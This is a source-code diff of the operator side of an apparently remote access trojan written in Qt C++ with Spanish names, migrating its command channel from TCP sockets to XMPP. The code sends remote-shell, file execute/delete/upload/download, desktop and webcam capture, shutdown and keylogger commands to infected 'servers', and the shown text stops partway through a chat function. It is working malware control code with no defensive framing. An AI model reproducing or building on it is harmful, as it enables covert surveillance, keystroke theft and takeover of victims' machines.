@@ -20,6 +20,9 @@
 #include "mainwindow.h"
 #include "ui_mainwindow.h"
 #include <QTranslator>
+#include <qxmpp/QXmppRosterManager.h>
+#include <qxmpp/QXmppMessage.h>
+#include <QInputDialog>
 
 MainWindow::MainWindow ( QWidget *parent ) :
     QMainWindow ( parent ),
@@ -27,12 +30,13 @@ MainWindow::MainWindow ( QWidget *parent ) :
 {
   QDir::setCurrent(QApplication::applicationDirPath());
   ui->setupUi ( this );
-  conexiones = 0;
-  activo = 0;
-  ventana.activo = 0;
-  socket[activo] = new QTcpSocket(0);
+  ui->textoContrasena->setEchoMode(QLineEdit::Password);
+  manager = new QXmppTransferManager;
+  cliente.addExtension(manager);
+  escritorio.cliente = &cliente;
   esconderFrames();
-  ui->frameConexion->show();
+  ui->frameLogin->show();
+  logado = false;
   // Poner los iconos a la lista de opciones
   QIcon icono;
   icono.addFile(":/icons/demonio.png");
@@ -69,6 +73,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   layoutPrincipal = new QGridLayout ( ui->centralWidget );
   layoutPrincipal->addWidget ( ui->listaOpciones );
   layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
+  layoutPrincipal->addWidget ( ui->frameLogin,0,1 );
   layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
   layoutPrincipal->addWidget ( ui->frameSistema,0,1 );
   layoutPrincipal->addWidget ( ui->frameProcesos,0,1 );
@@ -83,14 +88,20 @@ MainWindow::MainWindow ( QWidget *parent ) :
   layoutPrincipal->addWidget ( ui->notificacionLabel,1,0,1,-11);
   layoutPrincipal->setColumnStretch ( 1,300 );
   layoutPrincipal->setColumnStretch ( 0,100 );
-  ui->gridLayout->setColumnStretch ( 0,1 );
-  ui->gridLayout->setColumnStretch ( 2,900 );
+
 
   //conexiones de signals y slots
-  connect ( ui->servidoresLista,SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( seleccionarServidor() ) );
-  connect ( ui->botonEscuchar,SIGNAL ( clicked() ),this,SLOT ( escuchar() ) );
+
+  connect (ui->botonConectar,SIGNAL(clicked()),this,SLOT(conectar()));
+  connect (ui->arbolConectados,SIGNAL(clicked(QModelIndex)),this,SLOT(elegirServidor()));
+  connect (&cliente,SIGNAL(connected()),this,SLOT(confirmarConectado()));
+  connect (&cliente.rosterManager(),SIGNAL(rosterReceived()),this,SLOT(rosterRecibido()));
+  connect (&cliente,SIGNAL(messageReceived(const QXmppMessage&)),this,SLOT(llegadaDatos(const QXmppMessage&)));
+  connect(&cliente.rosterManager(),SIGNAL(presenceChanged(QString,QString)),this,SLOT(cambioRoster(QString,QString)));
+  connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(recibirArchivo(QXmppTransferJob*)));
+  connect(manager,SIGNAL(finished(QXmppTransferJob*)),this,SLOT(transferenciaCompleta(QXmppTransferJob*)));
+  connect (this,SIGNAL(procesar(QByteArray)),&escritorio.reco,SLOT(procesarImagen(QByteArray)));
   connect ( ui->botonCerrarServidor,SIGNAL ( clicked() ),this,SLOT ( cerrarServidor() ) );
-  connect ( ui->botonPing,SIGNAL ( clicked() ),this,SLOT ( ping() ) );
   connect ( ui->botonArchivos,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaArchivos() ) );
   connect ( ui->botonWebcam,SIGNAL(clicked()),this,SLOT(abrirVentanaWebcam()));
   connect ( ui->botonReiniciar,SIGNAL ( clicked() ),this,SLOT ( reinciar() ) );
@@ -98,6 +109,8 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect ( ui->botonApagar,SIGNAL(clicked()),this,SLOT(apagarEquipo()));
   connect ( ui->botonReiniciarEquipo,SIGNAL(clicked()),this,SLOT(reiniciarEquipo()));
   connect ( ui->botonMostrar,SIGNAL ( clicked() ),this,SLOT ( enviarMensaje() ) );
+  connect ( ui->botonAnadirServidor,SIGNAL(clicked()),this,SLOT(anadirServidor()));
+  connect ( ui->botonBorrarServidor,SIGNAL(clicked()),this,SLOT(borrarServidor()));
   connect ( ventana.directoriosLista(),SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( directorioCambio() ) );
   connect ( ventana.botonIr(),SIGNAL ( clicked() ),this,SLOT ( archivosIr() ) );
   connect ( ventana.rutaTexto(),SIGNAL ( returnPressed() ),this,SLOT ( archivosIr() ) );
@@ -123,18 +136,14 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect ( ui->actionAcerca_de,SIGNAL(triggered()),this,SLOT(about()));
   connect ( ui->actionLicencia,SIGNAL(triggered()),this,SLOT(licencia()));
   connect ( ui->actionSalir,SIGNAL(triggered()),this,SLOT(close()));
-  connect ( ui->actionConfigurar_puertos,SIGNAL(triggered()),this,SLOT(opcionesVentanaPuertos()));
   connect ( ui->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
   connect ( ui->botonAbrirChat,SIGNAL(clicked()),this,SLOT(abrirChat()));
   connect ( ui->botonCerrarChat,SIGNAL(clicked()),this,SLOT(cerrarChat()));
-  connect ( opcionesPuertos.botonPonerPuertos(),SIGNAL(clicked()),this,SLOT(ponerPuertos()) );
   connect (ui->botonActivarKeylogger,SIGNAL(clicked()),this,SLOT(activarKey()));
   connect (ui->botonDesactivarKeylogger,SIGNAL(clicked()),this,SLOT(desactivarKey()));
   connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
   connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
   connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
-  connect (ui->botonDemoxy,SIGNAL(clicked()),this,SLOT(conectarDemoxy()));
-  connect (&socketDemoxy,SIGNAL(readyRead()),this,SLOT(llegadaDatosDemoxy()));
   connect (&escritorio,SIGNAL(click(QString)),this,SLOT(clicado(QString)));
   connect (&escritorio,SIGNAL(tecla(QString)),this,SLOT(enviarTecla(QString)));
   connect (ui->botonActualizar,SIGNAL(clicked()),this,SLOT(actualizarProcesos()));
@@ -143,7 +152,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
 
 MainWindow::~MainWindow()
 {
-  server.close();
+
   delete ui;
 }
 void MainWindow::changeEvent ( QEvent *e )
@@ -174,7 +183,8 @@ bool MainWindow::event(QEvent *event)
 }
 void MainWindow::esconderFrames()
 {
-  /** Esta funcion esconde todos los frames **/
+  /** Esta funcion esconde todos los frames **/  
+  ui->frameLogin->hide();
   ui->frameConexion->hide();
   ui->frameInformacion->hide();
   ui->frameSistema->hide();
@@ -197,7 +207,14 @@ void MainWindow::listaOpciones()
     {
     case ( 0 ) :
     {
-      ui->frameConexion->show();
+      if(logado == true)
+      {
+        ui->frameConexion->show();
+      }
+      else
+      {
+        ui->frameLogin->show();
+      }
       break;
     }
     case ( 1 ) :
@@ -260,7 +277,105 @@ void MainWindow::listaOpciones()
     }
     }
 }
-
+void MainWindow::conectar()
+{
+    cliente.connectToServer(ui->textoUsuario->text(),ui->textoContrasena->text());
+    logado = true;
+    ui->frameLogin->hide();
+    ui->frameConexion->show();
+}
+void MainWindow::confirmarConectado()
+{
+    ui->notificacionLabel->setText("conectado");
+}
+void MainWindow::rosterRecibido()
+{
+    int i,j;
+    QStringList contactos = cliente.rosterManager().getRosterBareJids();
+    for(i=0;i<contactos.length();i++)
+    {
+        QTreeWidgetItem *item = new QTreeWidgetItem();
+        item->setText(0,contactos[i]);
+        QStringList recursos = cliente.rosterManager().getResources(contactos[i]);
+        QIcon online;
+        online.addFile(":/icons/user-offline.png");
+        item->setIcon(0,online);
+        for(j=0;j<recursos.length();j++)
+        {
+            item->addChild(new QTreeWidgetItem());
+            item->child(j)->setText(0,recursos[j]);
+            online.addFile(":/icons/user-online.png");
+            item->setIcon(0,online);
+            item->child(j)->setIcon(0,online);
+        }
+        listaItems.append(item);
+    }
+    ui->arbolConectados->addTopLevelItems(listaItems);
+}
+void MainWindow::cambioRoster(QString barejid, QString resource)
+{
+    if(cliente.rosterManager().isRosterReceived() == true)
+    {
+        QIcon online;
+        online.addFile(":/icons/user-online.png");
+        if(ui->arbolConectados->findItems(barejid,Qt::MatchExactly).size() == 0)
+        {
+            QTreeWidgetItem *item = new QTreeWidgetItem();
+            item->setText(0,barejid);
+            ui->arbolConectados->addTopLevelItem(item);
+        }
+        if(cliente.rosterManager().getPresence(barejid,resource).type() == QXmppPresence::Available)
+        {
+            QTreeWidgetItem *item = new QTreeWidgetItem();
+            item->setText(0,resource);
+            item->setIcon(0,online);
+            ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->addChild(item);
+        }
+        if(cliente.rosterManager().getPresence(barejid,resource).type() == QXmppPresence::Unavailable)
+        {
+            int i=0;
+            while(i<ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->childCount() && ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->child(i)->text(0) != resource)
+            {
+                i++;
+            }
+            ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->takeChild(i);
+            if(ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->childCount() == 0)
+            {
+                online.addFile(":/icons/user-offline.png");
+            }
+        }
+        ui->arbolConectados->findItems(barejid,Qt::MatchExactly)[0]->setIcon(0,online);
+    }
+}
+void MainWindow::elegirServidor()
+{
+    if(ui->arbolConectados->currentItem()->parent() != NULL)
+    {
+        servidor = ui->arbolConectados->currentItem()->parent()->text(0) + "/" + ui->arbolConectados->currentItem()->text(0);
+        ventana.servidor = servidor;
+        escritorio.servidor = servidor;
+        pedirInformacion();
+        ui->notificacionLabel->setText("Conectado a: " + servidor);
+    }
+}
+void MainWindow::anadirServidor()
+{
+    QXmppPresence solicitud;
+    solicitud.setTo(QInputDialog::getText(this,"A�adir servidor","Direccion del servidor"));
+    solicitud.setType(QXmppPresence::Subscribe);
+    cliente.sendPacket(solicitud);
+}
+void MainWindow::borrarServidor()
+{
+    if(ui->arbolConectados->topLevelItemCount() != 0)
+    {
+        if(ui->arbolConectados->currentItem()->parent() == NULL)
+        {
+            cliente.rosterManager().removeRosterEntry(ui->arbolConectados->currentItem()->text(0));
+            ui->arbolConectados->takeTopLevelItem(ui->arbolConectados->currentIndex().row());
+        }
+    }
+}
 void MainWindow::showAboutQt()
 {
   /** Muestra informacion sobre Qt **/
@@ -287,118 +402,11 @@ void MainWindow::opcionesServidor()
     /** abre la ventana de opciones del servidor **/
     opciones.show();
 }
-void MainWindow::opcionesVentanaPuertos()
-{
-    /** abre la ventana  de configuracion de puertos del cliente **/
-    opcionesPuertos.show();
-}
-void MainWindow::escuchar()
-{
-  /**pone a escuchar un servidor en el puerto indicado **/
-  ui->botonDemoxy->setEnabled(false);
-  port = 1234;
-  portArchivos = 2345;
-  portEscritorio = 3456;
-  portWebcam = 4567;
-  server.listen ( QHostAddress::Any,port );
-  serverArchivos.listen ( QHostAddress::Any,portArchivos );
-  serverEscritorio.listen ( QHostAddress::Any,portEscritorio );
-  serverWebcam.listen ( QHostAddress::Any,portWebcam );
-  connect ( &server,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexion() ) );
-  connect ( &serverArchivos,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionArchivos() ) );
-  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionEscritorio() ) );
-  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionWebcam() ) );
-  connect ( &mapa,SIGNAL ( mapped ( int ) ),this,SLOT ( desconectado ( int ) ) );
-  if ( server.isListening() && serverArchivos.isListening() && serverEscritorio.isListening() && serverWebcam.isListening()) //Si todos los sockets estan escuchando lo notificamos en un mensaje
-    {
-      ui->notificacionLabel->setText ( tr("Escuchando") );
-      ui->botonEscuchar->setEnabled(false);
-    }
-}
-void MainWindow::nuevaConexion()
-{
-  /** cuando una conexion entrante es escuchada por el servidor se la pasa a un socket libre del array de sockets **/
-  socket[conexiones] = server.nextPendingConnection();
-  connect ( socket[conexiones],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
-  connect ( socket[conexiones],SIGNAL ( disconnected() ),&mapa,SLOT ( map() ) );
-  mapa.setMapping ( socket[conexiones],conexiones );
-  socket[conexiones]->blockSignals ( true );
-  ui->servidoresLista->addItem ( socket[conexiones]->localAddress().toString() ); //mostrar la IP en la lista de servidores
-  conexiones++;
-}
-void MainWindow::nuevaConexionArchivos()
-{
-    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de Archivos **/
-  ventana.socketArchivos[ventana.conexiones] = serverArchivos.nextPendingConnection();
-  ventana.conexiones++;
-}
-void MainWindow::nuevaConexionEscritorio()
-{
-    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de escritorio **/
-  escritorio.socketEscritorio[escritorio.conexiones] = serverEscritorio.nextPendingConnection();
-  escritorio.conexiones++;
-}
 
-void MainWindow::nuevaConexionWebcam()
-{
-    /** Esta funcion se ejecuta cuando se establece una nueva conexion del socket de capturas de webcam **/
-    webcam.socketWebcam[webcam.conexiones] = serverWebcam.nextPendingConnection();
-    webcam.conexiones++;
-}
-void MainWindow::conectarDemoxy()
-{
-    ui->botonEscuchar->setEnabled(false); //No puede estar conectado a demoxy y escuchando conexiones a la vez (Por ahora)
-    ui->botonDemoxy->setEnabled(false);
-    hostDemoxy = QInputDialog::getText ( &ventana,tr("Host"),tr("Introduce la direccion del host") );
-    socketDemoxy.connectToHost(hostDemoxy,5555);
-    connect ( &mapa,SIGNAL ( mapped ( int ) ),this,SLOT ( desconectado ( int ) ) );
-}
-void MainWindow::nuevaConexionDemoxy()
-{
-    /** sistema de conexi�n Demoxy **/
-
-
-    socket[conexiones] = new QTcpSocket(this);
-    ventana.socketArchivos[ventana.conexiones] = new QTcpSocket(this);
-    escritorio.socketEscritorio[escritorio.conexiones] = new QTcpSocket(this);
-    webcam.socketWebcam[webcam.conexiones] = new QTcpSocket(this);
-
-    //Realizamos la conexion en los puertos 1111,2222,3333,4444
-    socket[conexiones]->connectToHost(hostDemoxy,1111);
-    ventana.socketArchivos[ventana.conexiones]->connectToHost(hostDemoxy,2222);
-    escritorio.socketEscritorio[escritorio.conexiones]->connectToHost(hostDemoxy,3333);
-    webcam.socketWebcam[webcam.conexiones]->connectToHost(hostDemoxy,4444);
-    connect ( socket[conexiones],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
-    //Notificamos si cada socket esta correctamente conectado
-
-    if( ventana.socketArchivos[ventana.conexiones]->state() == QAbstractSocket::ConnectedState )
-    {
-      ui->notificacionLabel->setText(tr("socket principal conectado a Demoxy"));
-    }
-    if(escritorio.socketEscritorio[escritorio.conexiones]->state() == QAbstractSocket::ConnectedState)
-    {
-      ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de escritorio conectado a Demoxy."));
-    }
-    if(webcam.socketWebcam[webcam.conexiones]->state() == QAbstractSocket::ConnectedState)
-    {
-      ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de webcam conectado a Demoxy."));
-    }
-    socket[conexiones]->waitForConnected();
-    ventana.socketArchivos[ventana.conexiones]->waitForConnected();
-    escritorio.socketEscritorio[escritorio.conexiones]->waitForConnected();
-    webcam.socketWebcam[webcam.conexiones]->waitForConnected();
-    connect ( socket[conexiones],SIGNAL ( disconnected() ),&mapa,SLOT ( map() ) );
-    mapa.setMapping ( socket[conexiones],conexiones );
-    conexiones++;
-    ventana.conexiones++;
-    escritorio.conexiones++;
-    webcam.conexiones++;
-    ui->servidoresLista->addItem("Servidor Demoxy");
-}
-void MainWindow::llegadaDatos()
+void MainWindow::llegadaDatos(const QXmppMessage &mensaje)
 {
   /** Esta funcion se ejecuta cuando llegan datos del socket principal **/
-  QString datos = socket[activo]->readAll(); //Leemos los datos
+  QString datos = mensaje.body();
   QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
 
   if( datos == "pong") //Si recibe respuesta de un ping
@@ -412,7 +420,7 @@ void MainWindow::llegadaDatos()
   if ( parametros[0] == "home" ) //Si llega la ruta del directorio home
     {
       ventana.establecerRuta ( parametros[1] );
-      util.escribirSocket ( "archivos|@|" + parametros[1],socket[activo] );
+     cliente.sendMessage(servidor, "archivos|@|" + parametros[1]);
     }
   if (parametros[0] == "tamano")
   {
@@ -426,7 +434,7 @@ void MainWindow::llegadaDatos()
   if ( parametros[0] == "file" ) //Si llega la lista de ficheros
     {
       ponerArchivos ( parametros );
-      util.escribirSocket ( "directorios|@|" + ventana.ruta,socket[activo] );
+     cliente.sendMessage(servidor, "directorios|@|" + ventana.ruta);
     }
   if ( parametros[0] == "folder" ) //si llega la lista de archivos
     {
@@ -467,7 +475,7 @@ void MainWindow::llegadaDatos()
     //ui->servidoresLista->currentItem()->setText(this->alias); //Poner en la lista el alias en vez de la IP
     escritorio.reco.imagen1 = new QImage(parametros[5].toInt(),parametros[6].toInt(),QImage::Format_RGB32);
     escritorio.reco.imagen1->fill(QColor(0,0,0).rgb());
-    util.escribirSocket("unidades|@|",socket[activo]);
+    cliente.sendMessage(servidor,"unidades|@|");
   }
   if(parametros[0] == "listaprocesos")
   {
@@ -478,95 +486,77 @@ void MainWindow::llegadaDatos()
     }
   }
 }
-void MainWindow::llegadaDatosDemoxy()
+
+void MainWindow::recibirArchivo(QXmppTransferJob* transferencia)
 {
-    QString datos = socketDemoxy.readAll(); //Leemos los datos
-    QStringList parametros = datos.split ( "|@|" ); //Separamos los parametros por |@|
-    if( parametros[0] == "conectado") //Si la conexiÃ³n proviene a traves de Demoxy
+    if(transferencia->fileInfo().name() == "|@|captura|@|")
     {
-      this->nuevaConexionDemoxy();
+        escritorio.refresco.stop();
+        datos.clear();
+        buffer.setBuffer(&datos);
+        buffer.open(QIODevice::WriteOnly);
+        transferencia->accept(&buffer);
     }
-    if( parametros[0] == "servidores")
+    else
     {
-        int i;
-        int max = parametros[1].toInt();
-        for(i=0;i<max;i++)
+        archivoRecibido = new QFile(ventana.rutaArchivo);
+        archivoRecibido->open(QFile::WriteOnly);
+        connect(transferencia,SIGNAL(progress(qint64,qint64)),this,SLOT(progreso(qint64,quint64 )));
+        transferencia->accept(archivoRecibido);
+    }
+}
+void MainWindow::transferenciaCompleta(QXmppTransferJob *transferencia)
+{
+    if(transferencia->fileInfo().name() == "|@|captura|@|")
+    {
+        emit procesar(datos);
+    }
+    else
+    {
+        if (ventana.rutaArchivo == "mini.jpg")
         {
-            this->nuevaConexionDemoxy();
+            QPixmap imagen;
+            imagen.load("mini.jpg");
+            ventana.labelMiniatura()->setPixmap(imagen);
+            ventana.rutaArchivo = "";
+            ventana.barraProgresoTransferencia()->setValue(0);
+
         }
+        archivoRecibido->close();
+        delete archivoRecibido;
     }
 }
-void MainWindow::seleccionarServidor()
+
+void MainWindow::progreso(qint64 hecho,quint64 total)
 {
-  /** se utiliza el indice de la lista para salecionar un socket del array y desbloquearle las seÃ±ales **/
-  socket[activo]->blockSignals ( true );
-  //El socket activo sera el mismo que el del indice elegido en la lista de servidores conectados
-  activo = ui->servidoresLista->currentIndex().row();
-  ventana.activo = activo;
-  escritorio.activo = activo;
-  webcam.activo = activo;
-  socket[activo]->blockSignals ( false );
-  util.escribirSocket("informacion|@|",socket[activo]);
-  ui->notificacionLabel->setText ( "IP: " + ui->servidoresLista->currentItem()->text() );
-  if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
-  {
-    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de archivos conectado."));
-  }
-  if(escritorio.socketEscritorio[activo]->state() == QAbstractSocket::ConnectedState)
-  {
-    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de escritorio conectado."));
-  }
-  if(webcam.socketWebcam[activo]->state() == QAbstractSocket::ConnectedState)
-  {
-    ui->notificacionLabel->setText(ui->notificacionLabel->text() + tr(" socket de webcam conectado."));
-  }
+    if(total != 0)
+    {
+        ventana.barraProgresoTransferencia()->setValue((hecho/total)*100);
+    }
 }
-void MainWindow::ping()
-{
-  /** hacer ping al host remoto **/
-  util.escribirSocket ( "ping",socket[activo] );
-}
+
+
+
 void MainWindow::cerrarServidor()
 {
   /** cierra el servdor **/
-  util.escribirSocket ( "cerrar",socket[activo] );
-}
-void MainWindow::desconectado ( int indice )
-{
-  /** cuando un socket se desconecta se borra de la lista y se reorganiza el array **/
-  int j;
-  ui->servidoresLista->takeItem ( indice );
-  socket[indice]->close();
-  ventana.socketArchivos[indice]->close();
-  escritorio.socketEscritorio[indice]->close();
-  //socket[indice]->~QTcpSocket(); //Da fallo de segmentaciÃ³n al intentar liberar la memoria del socket
-  for ( j=indice;conexiones - 1 > j;j++ )
-    {
-      socket[j] = socket[j + 1];
-      ventana.socketArchivos[j] = ventana.socketArchivos[j + 1];
-      escritorio.socketEscritorio[j] = escritorio.socketEscritorio[j + 1];
-    }
-  //Disminuimos los contadores de conexiones
-  conexiones--;
-  ventana.conexiones--;
-  escritorio.conexiones--;
-  webcam.conexiones--;
+ cliente.sendMessage(servidor, "cerrar" );
 }
 void MainWindow::shellEnviar()
 {
   /**Esta funcion envia datos a una shell remota **/
   QString datos = "shell|@|" + ui->entradaTexto->text();
-  util.escribirSocket ( datos,socket[activo] );
+ cliente.sendMessage(servidor, datos );
 }
 void MainWindow::reinciar()
 {
   /** Esta funcion envia la orden de reiniciar el servidor **/
-  util.escribirSocket ( "reiniciar",socket[activo] );
+ cliente.sendMessage(servidor, "reiniciar" );
 }
 void MainWindow::desinfectar()
 {
   /** Esta funcion envia la orden de desinfectar el sistema **/
-  util.escribirSocket ( "desinfectar",socket[activo] );
+ cliente.sendMessage(servidor, "desinfectar" );
 }
 void MainWindow::abrirVentanaArchivos()
 {
@@ -584,7 +574,7 @@ void MainWindow::cambioComboUnidad()
     /** Esta funcion se ejecuta cuando se elije una unidad en el administrador de archivos **/
     ventana.limpiarArchivos();
     ventana.establecerRuta ( ventana.comboUnidad()->currentText() );
-    util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
+   cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
 }
 void MainWindow::ponerUnidades(QStringList unidades)
 {
@@ -622,14 +612,14 @@ void MainWindow::directorioCambio()
       ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
       ventana.establecerRuta ( ventana.rutaAnterior );
       ventana.limpiarArchivos();
-      util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
+     cliente.sendMessage(servidor, "archivos|@|" + ventana.rutaAnterior );
     }
   else
     {
       ventana.ruta = ventana.ruta + "/" + nuevoDirectorio;
       ventana.establecerRuta ( ventana.ruta );
       ventana.limpiarArchivos();
-      util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
+     cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
     }
 }
 void MainWindow::archivosIr()
@@ -637,7 +627,7 @@ void MainWindow::archivosIr()
   /** Esta funcion envia la ruta a la que queremos navegar en el administrador de archivos **/
   ventana.limpiarArchivos();
   ventana.establecerRuta ( ventana.rutaTexto()->text() );
-  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
+ cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
 }
 void MainWindow::archivosAtras()
 {
@@ -645,19 +635,19 @@ void MainWindow::archivosAtras()
   ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
   ventana.establecerRuta ( ventana.rutaAnterior );
   ventana.limpiarArchivos();
-  util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
+ cliente.sendMessage(servidor, "archivos|@|" + ventana.rutaAnterior );
 }
 void MainWindow::archivosHome()
 {
   /** pide recibir la ruta del directorio home **/
   ventana.limpiarArchivos();
-  util.escribirSocket ( "home",socket[activo] );
+ cliente.sendMessage(servidor, "home" );
 }
 void MainWindow::archivosRefresco()
 {
   /** refresca la vista de archivos **/
   ventana.limpiarArchivos();
-  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
+ cliente.sendMessage(servidor, "archivos|@|" + ventana.ruta );
 }
 void MainWindow::archivosDescargar()
 {
@@ -669,7 +659,7 @@ void MainWindow::archivosDescargar()
         ventana.rutaArchivo = dialogo.getSaveFileName (&ventana,"Guardar archivo",dir );
         dialogo.show();
         QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
-        util.escribirSocket ( "get|@|" + rutaArchivo,socket[activo] );
+        cliente.sendMessage(servidor, "get|@|" + rutaArchivo );
     }
 }
 void MainWindow::archivosSubir()
@@ -678,8 +668,8 @@ void MainWindow::archivosSubir()
   QFileDialog archivo;
   QString nombreArchivo = archivo.getOpenFileName (&ventana,"Abrir archivo",QDir::homePath() );
   QStringList cachosArchivo = nombreArchivo.split ( "/" );
-  util.escribirSocket ( "put|@|" + cachosArchivo[cachosArchivo.size() - 1],socket[activo] );
-  ventana.subirArchivo ( nombreArchivo );
+  cliente.sendMessage(servidor, "put|@|" + cachosArchivo[cachosArchivo.size() - 1] );
+  job = manager->sendFile(servidor,nombreArchivo);
 }
 
 void MainWindow::archivosBorrar()        
@@ -695,21 +685,21 @@ void MainWindow::archivosBorrar()
         if(confirmacion.exec())
         {
             QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
-            util.escribirSocket ( "remove|@|" + rutaArchivo,socket[activo] );
+           cliente.sendMessage(servidor, "remove|@|" + rutaArchivo );
         }
     }
 }
 void MainWindow::archivosCarpeta()
 {
   QString nombre = QInputDialog::getText ( &ventana,"Nombre de la carpeta","Nombre de la carpeta" );
-  util.escribirSocket ( "createfolder|@|" + nombre,socket[activo] );
+ cliente.sendMessage(servidor, "createfolder|@|" + nombre );
 
 }
 void MainWindow::archivosEjecutar()
 {
     if( ventana.archivosLista()->currentRow() >= 0) {
         QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
-        util.escribirSocket ( "execute|@|" + rutaArchivo,socket[activo] );
+       cliente.sendMessage(servidor, "execute|@|" + rutaArchivo );
     }
 }
 void MainWindow::archivosCopiar()
@@ -729,7 +719,7 @@ void MainWindow::archivosCopiar()
     else
     {
         ventana.botonCopiar()->setText("Copiar");
-        util.escribirSocket("copiar|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
+        cliente.sendMessage(servidor,"copiar|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre);
     }
 }
 void MainWindow::archivosMover()
@@ -749,7 +739,7 @@ void MainWindow::archivosMover()
     else
     {
         ventana.botonMover()->setText("Mover");
-        util.escribirSocket("mover|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
+        cliente.sendMessage(servidor,"mover|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre);
     }
 }
 void MainWindow::archivosRenombrar()
@@ -757,14 +747,14 @@ void MainWindow::archivosRenombrar()
     if( ventana.archivosLista()->currentRow() >= 0) {
         QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
         QString nombre = QInputDialog::getText ( &ventana,"Nuevo nombre","Nuevo nombre" );
-        util.escribirSocket ( "renombrar|@|" + rutaArchivo + "|@|" + ventana.ruta + "/" + nombre,socket[activo] );
+       cliente.sendMessage(servidor, "renombrar|@|" + rutaArchivo + "|@|" + ventana.ruta + "/" + nombre );
     }
 }
 void MainWindow::archivosPrevia()
 {
     ventana.rutaArchivo = "mini.jpg";
     QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
-    util.escribirSocket ( "previa|@|" + rutaArchivo,socket[activo] );
+   cliente.sendMessage(servidor, "previa|@|" + rutaArchivo );
 }
 void MainWindow::archivosBorrarCarpeta()
 {
@@ -777,7 +767,7 @@ void MainWindow::archivosBorrarCarpeta()
     if(confirmacion.exec())
     {
         QString rutaCarpeta = ventana.ruta;
-        util.escribirSocket("borrarcarpeta|@|" + rutaCarpeta,socket[activo]);
+        cliente.sendMessage(servidor,"borrarcarpeta|@|" + rutaCarpeta);
         //archivosRefresco();
     }
 }
@@ -785,7 +775,7 @@ void MainWindow::archivosTamano()
 {
     if( ventana.archivosLista()->currentRow() >= 0) {
         QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
-        util.escribirSocket ( "tamano|@|" + rutaArchivo,socket[activo] );
+       cliente.sendMessage(servidor, "tamano|@|" + rutaArchivo );
     }
 }
 void MainWindow::enviarMensaje()
@@ -794,15 +784,15 @@ void MainWindow::enviarMensaje()
   mensaje = ui->textoMensaje->document()->toPlainText() + "|@|" + ui->textoTitulo->text();
   if ( ui->radioAlerta->isChecked() )
     {
-      util.escribirSocket ( "alerta|@|" + mensaje,socket[activo] );
+     cliente.sendMessage(servidor, "alerta|@|" + mensaje );
     }
   if ( ui->radioInformacion->isChecked() )
     {
-      util.escribirSocket ( "info|@|" + mensaje,socket[activo] );
+     cliente.sendMessage(servidor, "info|@|" + mensaje );
     }
   if ( ui->radioPeligro->isChecked() )
     {
-      util.escribirSocket ( "peligro|@|" + mensaje,socket[activo] );
+     cliente.sendMessage(servidor, "peligro|@|" + mensaje );
     }
 
 }
@@ -814,18 +804,18 @@ void MainWindow::abrirVentanaEscritorio()
 
 void MainWindow::abrirChat()
 {
-    util.escribirSocket("abrirchat",socket[activo]);
+    cliente.sendMessage(servidor,"abrirchat");
 }
 
 void MainWindow::cerrarChat()
 {
-    util.escribirSocket("cerrarchat",socket[activo]);
+    cliente.sendMessage(servidor,"cerrarchat");
 }
 
 void MainWindow::enviarMensajeChat()
 {
